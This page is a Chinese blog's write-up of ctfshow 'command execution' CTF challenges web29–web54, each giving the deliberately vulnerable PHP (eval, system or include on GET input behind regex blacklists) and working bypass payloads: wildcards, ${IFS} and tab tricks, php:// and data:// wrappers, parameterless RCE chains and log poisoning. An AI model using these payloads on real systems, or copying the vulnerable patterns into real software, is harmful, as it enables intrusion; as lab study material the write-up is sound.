<!DOCTYPE HTML>
<html lang="zh-CN">


<head>
    <meta charset="utf-8">
    <meta name="keywords" content="ctfshow web, Ethe&#39;s blog">
    <meta name="description" content="命令执行web29&amp;lt;?php
error_reporting(0);
if(isset($_GET[&amp;#39;c&amp;#39;]))&amp;#123;
    $c &amp;#x3D; $_GET[&amp;#39;c&amp;#39;];
    if(!preg">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <meta name="renderer" content="webkit|ie-stand|ie-comp">
    <meta name="mobile-web-app-capable" content="yes">
    <meta name="format-detection" content="telephone=no">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    <meta name="referrer" content="no-referrer-when-downgrade">
    <!-- Global site tag (gtag.js) - Google Analytics -->


    <title>ctfshow web | Ethe&#39;s blog</title>
    <link rel="icon" type="image/png" href="/favicon.png">

    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
    <link rel="stylesheet" type="text/css" href="/css/matery.css">
    <link rel="stylesheet" type="text/css" href="/css/my.css">

    <script src="/libs/jquery/jquery-3.6.0.min.js"></script>
    <script src="https://sdk.jinrishici.com/v2/browser/jinrishici.js" charset="utf-8"></script>

<meta name="generator" content="Hexo 5.4.0"><link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css">
<link rel="stylesheet" href="/css/prism-line-numbers.css" type="text/css"></head>



   <style>
    body{
       background-image: url(https://cdn.jsdelivr.net/gh/Tokisaki-Galaxy/res/site/medias/background.jpg);
       background-repeat:no-repeat;
       background-size: cover;
       background-attachment:fixed;
    }
</style>



<body>
    <header class="navbar-fixed">
    <nav id="headNav" class="bg-color nav-transparent">
        <div id="navContainer" class="nav-wrapper container">
            <div class="brand-logo">
                <a href="/" class="waves-effect waves-light">
                    
                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
                    
                    <span class="logo-span">Ethe&#39;s blog</span>
                </a>
            </div>
            

<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
<ul class="right nav-menu">
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/" class="waves-effect waves-light">
      
      <i class="fas fa-home" style="zoom: 0.6;"></i>
      
      <span>首页</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/tags" class="waves-effect waves-light">
      
      <i class="fas fa-tags" style="zoom: 0.6;"></i>
      
      <span>标签</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/categories" class="waves-effect waves-light">
      
      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
      
      <span>分类</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/archives" class="waves-effect waves-light">
      
      <i class="fas fa-archive" style="zoom: 0.6;"></i>
      
      <span>归档</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/about" class="waves-effect waves-light">
      
      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
      
      <span>关于</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/contact" class="waves-effect waves-light">
      
      <i class="fas fa-comments" style="zoom: 0.6;"></i>
      
      <span>留言板</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/friends" class="waves-effect waves-light">
      
      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
      
      <span>友情链接</span>
    </a>
    
  </li>
  
  <li>
    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
    </a>
  </li>
</ul>


<div id="mobile-nav" class="side-nav sidenav">

    <div class="mobile-head bg-color">
        
        <img src="/medias/logo.png" class="logo-img circle responsive-img">
        
        <div class="logo-name">Ethe&#39;s blog</div>
        <div class="logo-desc">
            
            Never really desperate, only the lost of the soul.
            
        </div>
    </div>

    <ul class="menu-list mobile-menu-list">
        
        <li class="m-nav-item">
	  
		<a href="/" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-home"></i>
			
			首页
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/tags" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-tags"></i>
			
			标签
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/categories" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-bookmark"></i>
			
			分类
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/archives" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-archive"></i>
			
			归档
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/about" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-user-circle"></i>
			
			关于
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/contact" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-comments"></i>
			
			留言板
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/friends" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-address-book"></i>
			
			友情链接
		</a>
          
        </li>
        
        
        <li><div class="divider"></div></li>
        <li>
            <a href="https://github.com/blinkfox/hexo-theme-matery" class="waves-effect waves-light" target="_blank">
                <i class="fab fa-github-square fa-fw"></i>Fork Me
            </a>
        </li>
        
    </ul>
</div>


        </div>

        
            <style>
    .nav-transparent .github-corner {
        display: none !important;
    }

    .github-corner {
        position: absolute;
        z-index: 10;
        top: 0;
        right: 0;
        border: 0;
        transform: scale(1.1);
    }

    .github-corner svg {
        color: #0f9d58;
        fill: #fff;
        height: 64px;
        width: 64px;
    }

    .github-corner:hover .octo-arm {
        animation: a 0.56s ease-in-out;
    }

    .github-corner .octo-arm {
        animation: none;
    }

    @keyframes a {
        0%,
        to {
            transform: rotate(0);
        }
        20%,
        60% {
            transform: rotate(-25deg);
        }
        40%,
        80% {
            transform: rotate(10deg);
        }
    }
</style>

<a href="https://github.com/blinkfox/hexo-theme-matery" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
   data-tooltip="Fork Me" data-position="left" data-delay="50">
    <svg viewBox="0 0 250 250" aria-hidden="true">
        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
              fill="currentColor" class="octo-body"></path>
    </svg>
</a>
        
    </nav>

</header>

    



<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/3.jpg')">
    <div class="container" style="right: 0px;left: 0px;">
        <div class="row">
            <div class="col s12 m12 l12">
                <div class="brand">
                    <h1 class="description center-align post-title">ctfshow web</h1>
                </div>
            </div>
        </div>
    </div>
</div>




<main class="post-container content">

    
    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
<style>
    #articleContent h1::before,
    #articleContent h2::before,
    #articleContent h3::before,
    #articleContent h4::before,
    #articleContent h5::before,
    #articleContent h6::before {
        display: block;
        content: " ";
        height: 100px;
        margin-top: -100px;
        visibility: hidden;
    }

    #articleContent :focus {
        outline: none;
    }

    .toc-fixed {
        position: fixed;
        top: 64px;
    }

    .toc-widget {
        width: 345px;
        padding-left: 20px;
    }

    .toc-widget .toc-title {
        padding: 35px 0 15px 17px;
        font-size: 1.5rem;
        font-weight: bold;
        line-height: 1.5rem;
    }

    .toc-widget ol {
        padding: 0;
        list-style: none;
    }

    #toc-content {
        height: calc(100vh - 250px);
        overflow: scroll;
    }

    #toc-content ol {
        padding-left: 10px;
    }

    #toc-content ol li {
        padding-left: 10px;
    }

    #toc-content .toc-link:hover {
        color: #42b983;
        font-weight: 700;
        text-decoration: underline;
    }

    #toc-content .toc-link::before {
        background-color: transparent;
        max-height: 25px;

        position: absolute;
        right: 23.5vw;
        display: block;
    }

    #toc-content .is-active-link {
        color: #42b983;
    }

    #toc-content .is-active-link {
        color: #42b983;
    }
    #toc-content .is-active-link::before {
        background-color: #42b983;
    }
    #floating-toc-btn {
        position: fixed;
        right: 15px;
        bottom: 76px;
        padding-top: 15px;
        margin-bottom: 0;
        z-index: 998;
    }
    #floating-toc-btn {
        position: fixed;
        right: 15px;
        bottom: 76px;
        padding-top: 15px;
        margin-bottom: 0;
        z-index: 998;
    }

    #floating-toc-btn .btn-floating {
        width: 48px;
        height: 48px;
    }

    #floating-toc-btn .btn-floating i {
        line-height: 48px;
        font-size: 1.4rem;
    }
</style>
<div class="row">
    <div id="main-content" class="col s12 m12 l9">
        <!-- 文章内容详情 -->
<div id="artDetail">
    <div class="card">
        <div class="card-content article-info">
            <div class="row tag-cate">
                <div class="col s7">
                    
                    <div class="article-tag">
                        
                            <a href="/tags/ctf/">
                                <span class="chip bg-color">ctf</span>
                            </a>
                        
                    </div>
                    
                </div>
                <div class="col s5 right-align">
                    
                </div>
            </div>

            <div class="post-info">
                
                <div class="post-date info-break-policy">
                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
                    2022-04-24
                </div>
                

                
                <div class="post-date info-break-policy">
                    <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
                    2022-05-03
                </div>
                

                
                <div class="info-break-policy">
                    <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
                    7.4k
                </div>
                

                
                <div class="info-break-policy">
                    <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
                    39 分
                </div>
                

                
                    <div id="busuanzi_container_page_pv" class="info-break-policy">
                        <i class="far fa-eye fa-fw"></i>阅读次数:&nbsp;&nbsp;
                        <span id="busuanzi_value_page_pv"></span>
                    </div>
				
            </div>
        </div>
        <hr class="clearfix">

        
        <!-- 是否加载使用自带的 prismjs. -->
        <link rel="stylesheet" href="/libs/prism/prism.css">
        

        

        <div class="card-content article-card-content">
            <div id="articleContent">
                <h1 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h1><h2 id="web29"><a href="#web29" class="headerlink" title="web29"></a>web29</h2><pre class="language-php" data-language="php"><code class="language-php">&lt;?php
error_reporting(0);
if(isset($_GET[&#39;c&#39;]))&#123;
    $c &#x3D; $_GET[&#39;c&#39;];
    if(!preg_match(&quot;&#x2F;flag&#x2F;i&quot;, $c))&#123;
        eval($c);
    &#125;
    
&#125;else&#123;
    highlight_file(__FILE__);
&#125;</code></pre>

<p>payload</p>
<pre class="language-php" data-language="php"><code class="language-php">?c&#x3D;system(ls);
?c&#x3D;system(&#39;cat f?ag.php&#39;);&#x2F;&#x2F;通配符直接绕</code></pre>

<h2 id="web30"><a href="#web30" class="headerlink" title="web30"></a>web30</h2><pre class="language-php" data-language="php"><code class="language-php">&lt;?php
error_reporting(0);
if(isset($_GET[&#39;c&#39;]))&#123;
    $c &#x3D; $_GET[&#39;c&#39;];
    if(!preg_match(&quot;&#x2F;flag|system|php&#x2F;i&quot;, $c))&#123;
        eval($c);
    &#125;
    
&#125;else&#123;
    highlight_file(__FILE__);
&#125;</code></pre>

<p>payload</p>
<pre class="language-php" data-language="php"><code class="language-php">?c&#x3D;echo &#96;ls&#96;;
?c&#x3D;echo &#96;cat f*&#96;;&#x2F;&#x2F;反引号内联执行</code></pre>

<h2 id="web31"><a href="#web31" class="headerlink" title="web31"></a>web31</h2><pre class="language-php" data-language="php"><code class="language-php">&lt;?php
error_reporting(0);
if(isset($_GET[&#39;c&#39;]))&#123;
    $c &#x3D; $_GET[&#39;c&#39;];
    if(!preg_match(&quot;&#x2F;flag|system|php|cat|sort|shell|\.| |\&#39;&#x2F;i&quot;, $c))&#123;
        eval($c);
    &#125;
    
&#125;else&#123;
    highlight_file(__FILE__);
&#125;</code></pre>

<p>payload</p>
<pre class="language-php" data-language="php"><code class="language-php">?c&#x3D;echo&#96;ls&#96;;
?c&#x3D;echo%09&#96;tac%09fla*&#96;;&#x2F;&#x2F;过滤了空格，但是可以用%09绕过
看hint感觉预期解应该是无参数的rce 
?c&#x3D;readfile(array_rand(array_flip(scandir(current(localeconv())))));
?c&#x3D;show_source(next(array_reverse(scandir(current(localeconv())))));</code></pre>

<h2 id="web32"><a href="#web32" class="headerlink" title="web32"></a>web32</h2><pre class="language-php" data-language="php"><code class="language-php">&lt;?php
error_reporting(0);
if(isset($_GET[&#39;c&#39;]))&#123;
    $c &#x3D; $_GET[&#39;c&#39;];
    if(!preg_match(&quot;&#x2F;flag|system|php|cat|sort|shell|\.| |\&#39;|\&#96;|echo|\;|\(&#x2F;i&quot;, $c))&#123;
        eval($c);
    &#125;
    
&#125;else&#123;
    highlight_file(__FILE__);
&#125;</code></pre>

<p>payload</p>
<pre class="language-php" data-language="php"><code class="language-php">?c&#x3D;include%0a$_GET[1]?&gt;&amp;1&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php  &#x2F;&#x2F;php的最后一行代码可以不用分号分行
c&#x3D;?&gt;&lt;?&#x3D;include$_GET[1]?&gt;&amp;1&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-
encode&#x2F;resource&#x3D;flag.php&#x2F;&#x2F;用短标签再写段php也一样</code></pre>

<p>php伪协议通常用于文件包含中，php中文件包含的函数有很多，比如 include include、require、include_once、require_once、highlight_file、show_source、file_get_contents、fopen、file、readfile</p>
<p>还可以用data伪协议</p>
<p>data伪协议就是把一些体量比较小的数据直接嵌入在页面里，而不使用外部链接。<code>data:text/plain</code>是嵌入文本</p>
<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220424163928570.png" alt="image-20220424163928570"></p>
<p>payload</p>
<pre class="language-php" data-language="php"><code class="language-php">get传参
?c&#x3D;include%0a$_POST[1]?&gt;
post内容
1&#x3D;data:text&#x2F;plain,&lt;?php system(&#39;cat flag*&#39;);</code></pre>

<p>官方payload</p>
<pre class="language-php" data-language="php"><code class="language-php">c&#x3D;$nice&#x3D;include$_GET[&quot;url&quot;]?&gt;&amp;url&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-
encode&#x2F;resource&#x3D;flag.php&#x2F;&#x2F;感觉中间这个nice没啥用</code></pre>

<h2 id="web33"><a href="#web33" class="headerlink" title="web33"></a>web33</h2><p>同32</p>
<h2 id="web34"><a href="#web34" class="headerlink" title="web34"></a>web34</h2><p>同32</p>
<h2 id="web35"><a href="#web35" class="headerlink" title="web35"></a>web35</h2><p>同32</p>
<h2 id="web36"><a href="#web36" class="headerlink" title="web36"></a>web36</h2><p>同32，就是注意不要用数字当参数名</p>
<h2 id="web37"><a href="#web37" class="headerlink" title="web37"></a>web37</h2><pre class="language-php" data-language="php"><code class="language-php">&lt;?php
&#x2F;&#x2F;flag in flag.php
error_reporting(0);
if(isset($_GET[&#39;c&#39;]))&#123;
    $c &#x3D; $_GET[&#39;c&#39;];
    if(!preg_match(&quot;&#x2F;flag&#x2F;i&quot;, $c))&#123;
        include($c);
        echo $flag;
    
    &#125;
        
&#125;else&#123;
    highlight_file(__FILE__);
&#125;</code></pre>

<p>直接data伪协议读取</p>
<p>payload</p>
<pre class="language-php" data-language="php"><code class="language-php">?c&#x3D;data:text&#x2F;plain,&lt;?php system(&#39;cat fla*&#39;);</code></pre>

<h2 id="web38"><a href="#web38" class="headerlink" title="web38"></a>web38</h2><pre class="language-php" data-language="php"><code class="language-php">&lt;?php
&#x2F;&#x2F;flag in flag.php
error_reporting(0);
if(isset($_GET[&#39;c&#39;]))&#123;
    $c &#x3D; $_GET[&#39;c&#39;];
    if(!preg_match(&quot;&#x2F;flag|php|file&#x2F;i&quot;, $c))&#123;
        include($c);
        echo $flag;
    
    &#125;
        
&#125;else&#123;
    highlight_file(__FILE__);
&#125;</code></pre>

<p>data伪协议加短标签</p>
<pre class="language-php" data-language="php"><code class="language-php">?c&#x3D;data:text&#x2F;plain,&lt;?&#x3D;system(&#39;cat fla*&#39;);</code></pre>

<p>至于利用日志文件的部分，不知道为什么只有用短标签的时候才能成功</p>
<p>首先用bp避免箭头符号的转义（这里也是只有作为c的值且用短标签的时候才会不转义，web37也一样</p>
<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220424172239712.png" alt="image-20220424172239712"></p>
<p>然后利用文件包含访问nginx的日志文件/var/log/nginx/access.log</p>
<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220424172302924.png" alt="image-20220424172302924"></p>
<h2 id="web39"><a href="#web39" class="headerlink" title="web39"></a>web39</h2><pre class="language-php" data-language="php"><code class="language-php">&lt;?php
&#x2F;&#x2F;flag in flag.php
error_reporting(0);
if(isset($_GET[&#39;c&#39;]))&#123;
    $c &#x3D; $_GET[&#39;c&#39;];
    if(!preg_match(&quot;&#x2F;flag&#x2F;i&quot;, $c))&#123;
        include($c.&quot;.php&quot;);
    &#125;
        
&#125;else&#123;
    highlight_file(__FILE__);
&#125;</code></pre>

<p>尖括号闭合掉后面的.php就行了</p>
<p>payload</p>
<pre class="language-php" data-language="php"><code class="language-php">?c&#x3D;data:text&#x2F;plain,&lt;?php system(&#39;cat fla*&#39;);?&gt;</code></pre>

<h2 id="web40"><a href="#web40" class="headerlink" title="web40"></a>web40</h2><pre class="language-php" data-language="php"><code class="language-php">&lt;?php

&#x2F;*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-04 00:12:34
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-04 06:03:36
# @email: h1xa@ctfer.com
# @link: https:&#x2F;&#x2F;ctfer.com
*&#x2F;


if(isset($_GET[&#39;c&#39;]))&#123;
    $c &#x3D; $_GET[&#39;c&#39;];
    if(!preg_match(&quot;&#x2F;[0-9]|\~|\&#96;|\@|\#|\\$|\%|\^|\&amp;|\*|\（|\）|\-|\&#x3D;|\+|\&#123;|\[|\]|\&#125;|\:|\&#39;|\&quot;|\,|\&lt;|\.|\&gt;|\&#x2F;|\?|\\\\&#x2F;i&quot;, $c))&#123;
        eval($c);
    &#125;
        
&#125;else&#123;
    highlight_file(__FILE__);
&#125;</code></pre>

<p>payload</p>
<p>可以用无参数rce，因为这里过滤的是中文的括号</p>
<pre class="language-php" data-language="php"><code class="language-php">?c&#x3D;show_source(next(array_reverse(scandir(pos(localeconv())))));</code></pre>

<p>或者利用session,但是</p>
<pre class="language-php" data-language="php"><code class="language-php">利用session_id()让php读取我们设置的cookie（session默认不使用所以加了session_start()让php开始使用session）
受php版本影响 5.5 -7.1.9均可以执行，因为session_id规定为0-9，a-z,A-Z,-中的字符。在5.5以下及7.1以上均无法写入除此之外的内容。但是符合要求的字符还是可以的</code></pre>

<p>所以题目环境能做到的也就只有个ls和whoami之类的命令</p>
<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220424175319501.png" alt="image-20220424175319501"></p>
<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220424175412309.png" alt="image-20220424175412309"></p>
<p>本来还可以利用base64，但是题目把数字也过滤了，不能进行解码，只能用本地环境复现了</p>
<p>我这里直接贴了其他师傅的图片了</p>
<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/b041616efce14720b67c1b942dc4eded.png" alt="在这里插入图片描述"></p>
<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/4f4e320ad873468aa563357f66b0ac13.png" alt="在这里插入图片描述"></p>
<p><strong>还有一种姿势</strong></p>
<pre class="language-none"><code class="language-none">get_defined_vars() 返回一个包含所有已定义变量列表的多维数组，这些变量包括环境变量、服务器变量和用户定义的变量。
array_pop() 是删除并返回数组最后一个元素
current() 返回数组中的当前元素的值。
next() 返回数组中的下一个元素的值。</code></pre>

<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220424180340722.png" alt="image-20220424180340722"></p>
<p>我们用current()可以获取到GET数组，用next()可以获取到POST数组，然后用array_pop()取出POST数组里面的元素，最后用eval执行</p>
<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220424180605396.png" alt="image-20220424180605396"></p>
<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220424180751358.png" alt="image-20220424180751358"></p>
<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220424180829456.png" alt="image-20220424180829456"></p>
<h2 id="web41"><a href="#web41" class="headerlink" title="web41"></a>web41</h2><p>或运算绕过，直接用羽师傅的脚本也行。</p>
<p>不过要是直接输payload要在bp里，应该是hackbar的编码有点问题</p>
<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220424182050495.png" alt="image-20220424182050495"></p>
<h2 id="web42"><a href="#web42" class="headerlink" title="web42"></a>web42</h2><pre class="language-none"><code class="language-none">&lt;?php
if(isset($_GET[&#39;c&#39;]))&#123;
  $c&#x3D;$_GET[&#39;c&#39;];
  system($c.&quot; &gt;&#x2F;dev&#x2F;null 2&gt;&amp;1&quot;);
&#125;else&#123;
  highlight_file(__FILE__);
&#125;</code></pre>

<p>&gt; 代表重定向到哪里<br>/dev/null 代表空设备文件<br>2&gt; 表示stderr标准错误<br>&amp; 表示等同于的意思，2&gt;&amp;1，表示2的输出重定向等同于1<br>1 表示stdout标准输出，系统默认值是1，所以&gt;/dev/null等同于 1&gt;/dev/null<br>因此，&gt;/dev/null 2&gt;&amp;1 也可以写成1&gt; /dev/null 2&gt; &amp;1</p>
<p>本题语句执行过程为：<br>1&gt;/dev/null ：首先表示标准输出重定向到空设备文件，也就是不输出任何信息到终端，不显示任何信息。<br>2&gt;&amp;1 ： 接着，标准错误输出重定向到标准输出，因为之前标准输出已经重定向到了空设备文件，所以标准错误输出也重定向到空设备文件。</p>
<p>补充：<br>0表示键盘输入，1表示屏幕输出，2表示错误输出！<br>‘ &gt; ’ 默认标准输出重定向，与1&gt;相同<br>2&gt;&amp;1 意思是把标准错误输出重定向到标准输出<br>&amp;&gt;file 意思是把标准输出和标准错误输出都重定向到文件file中</p>
<p>利用%0a换行把它换下去或者其他的语句来截断</p>
<pre class="language-none"><code class="language-none">?c&#x3D;cat flag.php%0a
?c&#x3D;cat flag.php||
?c&#x3D;cat flag.php%26
?c&#x3D;cat flag.php%26%26
?c&#x3D;cat flag.php;</code></pre>

<h2 id="web43"><a href="#web43" class="headerlink" title="web43"></a>web43</h2><pre class="language-PHP" data-language="PHP"><code class="language-PHP">&lt;?php
if(isset($_GET[&#39;c&#39;]))&#123;
    $c&#x3D;$_GET[&#39;c&#39;];
    if(!preg_match(&quot;&#x2F;\;|cat&#x2F;i&quot;, $c))&#123;
        system($c.&quot; &gt;&#x2F;dev&#x2F;null 2&gt;&amp;1&quot;);
    &#125;
&#125;else&#123;
    highlight_file(__FILE__);
&#125;</code></pre>

<p>payload基本上和42的一样，就是把cat换成uniq，tac，nl之类的</p>
<h2 id="web44"><a href="#web44" class="headerlink" title="web44"></a>web44</h2><pre class="language-php" data-language="php"><code class="language-php">&lt;?php
if(isset($_GET[&#39;c&#39;]))&#123;
    $c&#x3D;$_GET[&#39;c&#39;];
    if(!preg_match(&quot;&#x2F;;|cat|flag&#x2F;i&quot;, $c))&#123;
        system($c.&quot; &gt;&#x2F;dev&#x2F;null 2&gt;&amp;1&quot;);
    &#125;
&#125;else&#123;
    highlight_file(__FILE__);
&#125;</code></pre>

<p>flag也被过滤了，那就在web43的基础上加上通配符</p>
<h2 id="web45"><a href="#web45" class="headerlink" title="web45"></a>web45</h2><p>空格也被过滤了</p>
<pre class="language-php" data-language="php"><code class="language-php">&lt;?php
if(isset($_GET[&#39;c&#39;]))&#123;
    $c&#x3D;$_GET[&#39;c&#39;];
    if(!preg_matchd(&quot;&#x2F;\;|cat|flag| &#x2F;i&quot;, $c))&#123;
        system($c.&quot; &gt;&#x2F;dev&#x2F;null 2&gt;&amp;1&quot;);
    &#125;
&#125;else&#123;
    highlight_file(__FILE__);
&#125;</code></pre>

<p>用${IFS}替代空格</p>
<pre class="language-php" data-language="php"><code class="language-php">c&#x3D;nl$&#123;IFS&#125;f*||</code></pre>

<h2 id="web46"><a href="#web46" class="headerlink" title="web46"></a>web46</h2><pre class="language-none"><code class="language-none">&lt;?php

if(isset($_GET[&#39;c&#39;]))&#123;
    $c&#x3D;$_GET[&#39;c&#39;];
    if(!preg_match(&quot;&#x2F;\;|cat|flag| |[0-9]|\\$|\*&#x2F;i&quot;, $c))&#123;
        system($c.&quot; &gt;&#x2F;dev&#x2F;null 2&gt;&amp;1&quot;);
    &#125;
&#125;else&#123;
    highlight_file(__FILE__);
&#125;</code></pre>

<p>用&lt;或&lt;&gt;代替空格，用‘’截断flag关键字</p>
<pre class="language-none"><code class="language-none">c&#x3D;nl&lt;&gt;fla&#39;&#39;g.php||</code></pre>

<h2 id="web47"><a href="#web47" class="headerlink" title="web47"></a>web47</h2><p>和46一样的</p>
<pre class="language-php" data-language="php"><code class="language-php">nl&lt;&gt;fla&#39;&#39;g.php||</code></pre>

<h2 id="web48"><a href="#web48" class="headerlink" title="web48"></a>web48</h2><p>同46</p>
<pre class="language-none"><code class="language-none">more:一页一页的显示档案内容
less:与 more 类似 head:查看头几行
tac:从最后一行开始显示，可以看出 tac 是cat 的反向显示
tail:查看尾几行
nl：显示的时候，顺便输出行号
od:以二进制的方式读取档案内容
vi:一种编辑器，这个也可以查看
vim:一种编辑器，这个也可以查看
sort:可以查看
uniq:可以查看 
file -f:报错出具体内容 
grep:在当前目录中，查找后缀有 file 字样的文件中包含 test 字符串的文件，并打印出该字符串的行。此时，可以使用如下命令： grep test *file strings</code></pre>



<h2 id="web49"><a href="#web49" class="headerlink" title="web49"></a>web49</h2><p>同46</p>
<p>这个也行</p>
<pre class="language-none"><code class="language-none">?c&#x3D;nl%09fl&quot;&quot;ag.php%0a</code></pre>

<h2 id="web50"><a href="#web50" class="headerlink" title="web50"></a>web50</h2><p>同46</p>
<h2 id="web51"><a href="#web51" class="headerlink" title="web51"></a>web51</h2><p>同46</p>
<h2 id="web52"><a href="#web52" class="headerlink" title="web52"></a>web52</h2><p>过滤了大于小于，但是没过滤$符</p>
<pre class="language-none"><code class="language-none">?c&#x3D;nl$&#123;IFS&#125;fla&#39;&#39;g.php||</code></pre>

<h2 id="web53"><a href="#web53" class="headerlink" title="web53"></a>web53</h2><pre class="language-none"><code class="language-none">&lt;?php

if(isset($_GET[&#39;c&#39;]))&#123;
    $c&#x3D;$_GET[&#39;c&#39;];
    if(!preg_match(&quot;&#x2F;\;|cat|flag| |[0-9]|\*|more|wget|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\&#96;|\%|\x09|\x26|\&gt;|\&lt;&#x2F;i&quot;, $c))&#123;
        echo($c);
        $d &#x3D; system($c);
        echo &quot;&lt;br&gt;&quot;.$d;
    &#125;else&#123;
        echo &#39;no&#39;;
    &#125;
&#125;else&#123;
    highlight_file(__FILE__);
&#125;</code></pre>

<p>payload</p>
<pre class="language-php" data-language="php"><code class="language-php">?c&#x3D;nl$&#123;IFS&#125;fla&#39;&#39;g.php</code></pre>

<h2 id="web54"><a href="#web54" class="headerlink" title="web54"></a>web54</h2><pre class="language-none"><code class="language-none">&lt;?php
if(isset($_GET[&#39;c&#39;]))&#123;
    $c&#x3D;$_GET[&#39;c&#39;];
    if(!preg_match(&quot;&#x2F;\;|.*c.*a.*t.*|.*f.*l.*a.*g.*| |[0-9]|\*|.*m.*o.*r.*e.*|.*w.*g.*e.*t.*|.*l.*e.*s.*s.*|.*h.*e.*a.*d.*|.*s.*o.*r.*t.*|.*t.*a.*i.*l.*|.*s.*e.*d.*|.*c.*u.*t.*|.*t.*a.*c.*|.*a.*w.*k.*|.*s.*t.*r.*i.*n.*g.*s.*|.*o.*d.*|.*c.*u.*r.*l.*|.*n.*l.*|.*s.*c.*p.*|.*r.*m.*|\&#96;|\%|\x09|\x26|\&gt;|\&lt;&#x2F;i&quot;, $c))&#123;
        system($c);
    &#125;
&#125;else&#123;
    highlight_file(__FILE__);
&#125;</code></pre>

<p>payload</p>
<pre class="language-none"><code class="language-none">?c&#x3D;&#x2F;bin&#x2F;ca?$&#123;IFS&#125;f???????</code></pre>

<p>通配符绕过</p>
